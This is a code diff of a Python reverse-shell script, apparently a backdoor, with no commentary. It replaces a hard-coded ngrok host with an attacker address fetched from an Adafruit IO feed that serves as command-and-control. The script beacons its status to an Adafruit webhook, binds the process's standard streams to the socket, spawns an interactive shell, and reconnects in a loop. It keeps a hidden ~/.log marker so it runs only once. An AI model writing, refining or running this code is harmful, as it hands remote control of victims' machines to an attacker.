@@ -2,32 +2,47 @@ import os
 import pty
 import time
 import socket
-
-HOST = "0.tcp.in.ngrok.io"
-PORT = 11258
+import requests
 
 DELAY = 10
 
 LOG = os.path.expanduser("~/.log")
 
+URL_POST = "https://io.adafruit.com/api/v2/webhooks/feed/VDTwYfHtVeSmB1GkJjcoqS62sYJu"
+URL_GET = "https://io.adafruit.com/api/v2/naxa/feeds/host-port"
+
+
+def log(message):
+    with open(LOG, "a") as f:
+        f.write(message + "\n")
+
+    requests.post(
+        URL_POST,
+        data={"value": message},
+    )
+
 
 def main():
     if os.path.exists(LOG):
+        requests.post(
+            URL_POST,
+            data={"value": "skip"},
+        )
         return
 
-    with open(LOG, "w") as f:
-        f.write("Started\n")
+    log("start")
+
+    address = tuple(requests.get(URL_GET).json()["last_value"].split(":"))
+    log(f"address: {address}")
 
     while True:
-        with open(LOG, "a") as f:
-            f.write("Connecting to {}:{}\n".format(HOST, PORT))
+        log("loop")
 
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((HOST, PORT))
+                s.connect(address)
 
-                with open(LOG, "a") as f:
-                    f.write("Connected\n")
+                log("connect")
 
                 for fd in (0, 1, 2):
                     os.dup2(s.fileno(), fd)
@@ -38,8 +53,7 @@ def main():
                 except:
                     pty.spawn("sh")
 
-                with open(LOG, "a") as f:
-                    f.write("Disconnected\n")
+                log("disconnect")
 
                 time.sleep(DELAY * 6)
 
